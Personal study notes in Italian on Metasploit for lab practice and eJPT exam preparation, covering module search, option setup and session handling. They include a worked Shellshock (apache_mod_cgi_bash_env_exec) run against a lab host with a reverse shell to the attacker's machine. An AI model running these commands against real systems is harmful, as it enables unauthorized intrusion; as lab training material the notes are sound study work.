# Metasploit Notes

Appunti personali sull’utilizzo di Metasploit per exploitation in ambienti di laboratorio e preparazione eJPT.

## Avvio

```bash
msfconsole
```

## Ricerca moduli

```bash
search nome_servizio
search cgi
search vsftpd
search samba
```

## Selezione modulo

```bash
use exploit/path/del/modulo
```

Esempio:

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
```

## Controllo opzioni

```bash
show options
```

## Parametri principali

```text
RHOSTS = IP o hostname del target
LHOST = IP della macchina attaccante
TARGETURI = percorso web da colpire
RPORT = porta del servizio
```

## Esempio CGI / Shellshock

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
set LHOST <IP_KALI>
run
```

## Gestione sessioni

```bash
sessions
sessions -i 1
background
```

## Regole importanti

- Controllare sempre `show options`
- Non usare `127.0.0.1` come LHOST per reverse shell
- Usare Metasploit solo in ambienti autorizzati
- Prima enumerare, poi scegliere l’exploit
